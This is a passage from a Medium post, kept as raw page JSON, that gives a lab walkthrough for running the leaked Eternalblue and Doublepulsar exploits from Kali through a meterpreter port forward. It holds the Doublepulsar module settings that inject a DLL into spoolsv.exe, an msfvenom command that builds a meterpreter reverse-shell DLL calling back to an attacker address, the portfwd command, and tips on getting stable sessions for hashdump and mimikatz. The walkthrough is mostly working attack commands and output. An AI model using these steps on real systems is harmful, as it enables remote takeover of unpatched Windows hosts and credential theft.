this case) and when it comes time to pick a process to inject into, you might get mixed results depending on what you use. Lsass.exe is the default and for meterpreter it tends to be unstable in 7/2008, with commands like hashdump and mimikatz failing frequently, but has worked well in testing with XP. I’ve been having better luck with spoolsv.exe when exploit 7/2008.","markups":[]},{"name":"4bc1","type":1,"text":"Once configured, it should look something like this:","markups":[]},{"name":"2e0a","type":8,"text":"Local\n=====","markups":[]},{"name":"ecad","type":8,"text":"Proto   Listen IP        Source IP        Destination IP\n-----   --------------   --------------   --------------\nTCP     127.0.0.1:9000   Redirector:ANY   127.0.0.1:9000","markups":[]},{"name":"f6e7","type":8,"text":"Remote\n======","markups":[]},{"name":"7858","type":8,"text":"*empty*","markups":[]},{"name":"7930","type":8,"text":"[!] Verify Redirection Tunnels Exist\n[?] Press Any Key To Continue :","markups":[]},{"name":"dbfd","type":8,"text":"Module: Doublepulsar\n====================","markups":[]},{"name":"d05b","type":8,"text":"Name                  Set Value                               Redirected Value    \n----                  ---------                               ----------------    \nNetworkTimeout        60                                                          \nTargetIp              127.0.0.1                               127.0.0.1           \nTargetPort            9000                                    9000                \nDllPayload            c:\\fuzzbunch-debian\\windows\\file.dll                        \nDllOrdinal            1                                                           \nProcessName           spoolsv.exe                                                 \nProcessCommandLine                                                                \nProtocol              SMB                                                         \nArchitecture          x64                                                         \nFunction              RunDLL","markups":[]},{"name":"db7f","type":8,"text":"[?] Execute Plugin? [Yes] :","markups":[]},{"name":"f9d3","type":1,"text":"A successful DLL injection will look like this:","markups":[]},{"name":"1293","type":4,"text":"Doublepulsar Injecting DLL","markups":[],"layout":1,"metadata":{"id":"1*MZXs8ml_y2eRQFtuJK2Hxw.png","originalWidth":1025,"originalHeight":795}},{"name":"9a78","type":1,"text":"And you should see a new meterpreter session in Metasploit:","markups":[]},{"name":"85a8","type":4,"text":"Success!","markups":[],"layout":1,"metadata":{"id":"1*zlGlxJBZ_feXjyFOapgQAw.png","originalWidth":1168,"originalHeight":770}},{"name":"d5b5","type":1,"text":"In the lab scenario depicted above the machine exploited with Eternalblue was x64, but this technique is also effective against x86 hosts as well as hosts running XP:","markups":[]},{"name":"e4d6","type":4,"text":"Doublepulsar Against an x86 Victim Through a Portfwd Tunnel","markups":[],"layout":1,"metadata":{"id":"1*WbfOuYH-rH-ZkiwhxCX6LQ.png","originalWidth":979,"originalHeight":1106}},{"name":"0e3a","type":3,"text":"Reference:","markups":[]},{"name":"4ebc","type":1,"text":"mdiazcl’s Github Site With the Fuzzbunch Port to Debian:","markups":[{"type":1,"start":0,"end":56}]},{"name":"c161","type":1,"text":"https://github.com/mdiazcl/fuzzbunch-debian","markups":[{"type":3,"start":0,"end":43,"href":"https://github.com/mdiazcl/fuzzbunch-debian","title":"","rel":"nofollow noopener","anchorType":0}]},{"name":"b30f","type":1,"text":"Generate DLL Payload for DoublePulsar DLL Injection:","markups":[{"type":1,"start":0,"end":52}]},{"name":"3fcd","type":8,"text":"msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.0.0.35 lport=4444 — platform windows -f dll -o file.dll","markups":[]},{"name":"2874","type":1,"text":"Start Fuzzbunch in Wine:","markups":[{"type":1,"start":0,"end":24}]},{"name":"2b5a","type":8,"text":"#!/bin/bash\nexport WINEPREFIX=$HOME/.wine-fuzzbunch\ncd $HOME/.wine-fuzzbunch/drive_c/fuzzbunch-debian/windows\nwine cmd.exe\npython fb.py","markups":[]},{"name":"80f1","type":1,"text":"Portfwd in Meterpreter:","markups":[{"type":1,"start":0,"end":23}]},{"name":"a7bd","type":8,"text":"portfwd add -l 9000 -p 445 -r 192.168.55.65","markups":[]},{"name":"dbf2","type":1,"text":"Offensive Security Portfwd Reference:","markups":[{"type":1,"start":0,"end":37}]},{"name":"0646","type":1,"text":"https://www.offensive-security.com/metasploit-unleashed/portfwd/","markups":[{"type":3,"start":0,"end":64,"href":"https://www.offensive-security.com/metasploit-unleashed/portfwd/","title":"","rel":"nofollow","anchorType":0}]}],"sections":[{"name":"e24d","startIndex":0}]},"postDisplay":{"coverless":true}},"virtuals":{"allowNotes":true,"previewImage":{"imageId":"1*P4Jga1j8eU0oEfDTmhTV1g.png","filter":"","backgroundSize":"","originalWidth":580,"originalHeight":752,"strategy":"resample","height":0,"width":0},"wordCount":1387,"imageCount":10,"readingTime":6.483962264150944,"subtitle":"Eternalblue and the rest of the Windows exploits released by the Equation Group are built to run on Windows, not Linux. While there are…","usersBySocialRecommends":[],"noIndex":false,"recommends":5,"socialRecommends":[],"isBookmarked":false,"tags":[{"slug":"hacking","name":"Hacking","postCount":8179,"metadata":{"postCount":8179,"coverImage":{"id":"1*25uH5YUBt8AF3Ub3sCqMRA.png","originalWidth":640,"originalHeight":359,"isFeatured":true}},"type":"Tag"},{"slug":"eternalblue","name":"Eternalblue","postCount":10,"metadata":{"postCount":10,"coverImage":{"id":"1*4x-lFzP008DFyTYOxw59bw@2x.jpeg","originalWidth":674,"originalHeight":417,"backgroundSize":"","filter":"","isFeatured":false,"externalSrc":"","focusPercentX":-1,"focusPercentY":-1,"alt":"","repairedAt":0}},"type":"Tag"},{"slug":"ms17-010","name":"Ms17 010","postCount":4,"metadata":{"postCount":4,"coverImage":{"id":"1*P4Jga1j8eU0oEfDTmhTV1g.png","originalWidth":580,"originalHeight":752,"isFeatured":true}},"type":"Tag"},{"slug":"fuzzbunch","name":"Fuzzbunch","postCount":0,"metadata":{"postCount":0,"coverImage":{"id":"1*P4Jga1j8eU0oEfDTmhTV1g.png","originalWidth":580,"originalHeight":752,"isFeatured":true}},"type":"Tag"}],"socialRecommendsCount":0,"responsesCreatedCount":1,"links":{"entries":[{"url":"https://github.com/mdiazcl/fuzzbunch-debian","alts":[],"httpStatus":200},{"url":"https://github.com/RiskSense-Ops/MS17-010","alts":[],"httpStatus":200},{"url":"https://www.offensive-security.com/metasploit-unleashed/portfwd/","alts":[],"httpStatus":200}],"version":"0.3","generatedAt":1496801324609},"isLockedPreviewOnly":false,"takeoverId":"","metaDescription":"","totalClapCount":8,"sectionCount":1,"readingList":0,"topics":[]},"coverless":true,"slug":"running-eternalblue-on-kali-through-a-meterpreter-port-forward","translationSourcePostId":"","translationSourceCreatorId":"","isApprovedTranslation":false,"inResponseToPostId":"","inResponseToRemovedAt":0,"isTitleSynthesized":true,"allowResponses":true,"importedUrl":"","importedPublishedAt":0,"visibility":0,"uniqueSlug":"running-eternalblue-on-kali-through-a-meterpreter-port-forward-edd877dfd724","previewContent":{"bodyModel":{"paragraphs":[{"name":"previewImage","type":4,"text":"","layout":10,"metadata":{"id":"1*P4Jga1j8eU0oEfDTmhTV1g.png","originalWidth":580,"originalHeight":752,"isFeatured":true}},{"name":"29e2","type":3,"text":"Running Fuzzbunch on Kali Through a Meterpreter Port Forward","markups":[],"alignment":1}],"sections":[{"startIndex":0}]},"isFullContent":false,"subtitle":"Eternalblue and the rest of the Windows exploits released by the Equation Group are built to run on Windows, not Linux. While there are…"},"license":0,"inResponseToMediaResourceId":"","canonicalUrl":"https://medium.com/@joe_norton/running-eternalblue-on-kali-through-a-meterpreter-port-forward-edd877dfd724","approvedHomeCollectionId":"","newsletterId":"","webCanonicalUrl":"https://medium.com/@joe_norton/running-eternalblue-on-kali-through-a-meterpreter-port-forward-edd877dfd724","mediumUrl":"https://medium.com/@joe_norton/running-eternalblue-on-kali-through-a-meterpreter-port-forward-edd877dfd724","migrationId":"","notifyFollowers":true,"notifyTwitter":false,"notifyFacebook":false,"responseHiddenOnParentPostAt":0,"isSeries":false,"isSubscriptionLocked":false,"seriesLastAppendedAt":0,"audioVersionDurationSec":0,"sequenceId":"","isNsfw":false,"isEligibleForRevenue":false,"isBlockedFromHightower":false,"deletedAt":0,"lockedPostSource":0,"hightowerMinimumGuaranteeStartsAt":0,"hightowerMinimumGuaranteeEndsAt":0,"featureLockRequestAcceptedAt":0,"mongerRequestType":1,"layerCake":0,"socialTitle":"","socialDek":"","editorialPreviewTitle":"","editorialPreviewDek":"","curationEligibleAt":0,"type":"Post"},"mentionedUsers":[],"collaborators":[],"collectionUserRelations":[],"mode":null,"references":{"User":{"5652bace719b":{"userId":"5652bace719b","name":"Joe Norton","username":"joe_norton","createdAt":1490139156472,"imageId":"1*dmbNkD5D-u45r44go_cf0g.png","backgroundImageId":"","bio":"","twitterScreenName":"","socialStats":{"userId":"5652bace719b","usersFollowedCount":5,"usersFollowedByCount":18,"type":"SocialStats"},"social":{"userId":"lo_S54htN6xjJnm","targetUserId":"5652bace719b","type":"Social"},"facebookAccountId":"","allowNotes":1,"mediumMemberAt":0,"isNsfw":false,"type":"User"}},"Social":{"5652bace719b":{"userId":"lo_S54htN6xjJnm","targetUserId":"5652bace719b","type":"Social"}},"SocialStats":{"5652bace719b":{"userId":"5652bace719b","usersFollowedCount":5,"usersFollowedByCount":18,"type":"SocialStats"}}}})
// ]]></script><script id="parsely-cfg" src="//d1z2jf7jlzjs58.cloudfront.net/keys/medium.com/p.js"></script><script type="text/javascript">(function(b,r,a,n,c,h,_,s,d,k){if(!b[n]||!b[n]._q){for(;s<_.length;)c(h,_[s++]);d=r.createElement(a);d.async=1;d.src="https://cdn.branch.io/branch-latest.min.js";k=r.getElementsByTagName(a)[0];k.parentNode.insertBefore(d,k);b[n]=h}})(window,document,"script","branch",function(b,r){b[r]=function(){b._q.push([r,arguments])}},{_q:[],_v:1},"addListener applyCode autoAppIndex banner closeBanner closeJourney creditHistory credits data deepview deepviewCta first getCode init link logout redeem referrals removeListener sendSMS setBranchViewData setIdentity track validateCode trackCommerceEvent logEvent".split(" "), 0); branch.init('key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm', {'no_journeys': true, 'disable_exit_animation': true, 'disable_entry_animation': true}, function(err, data) {});</script></body></html>
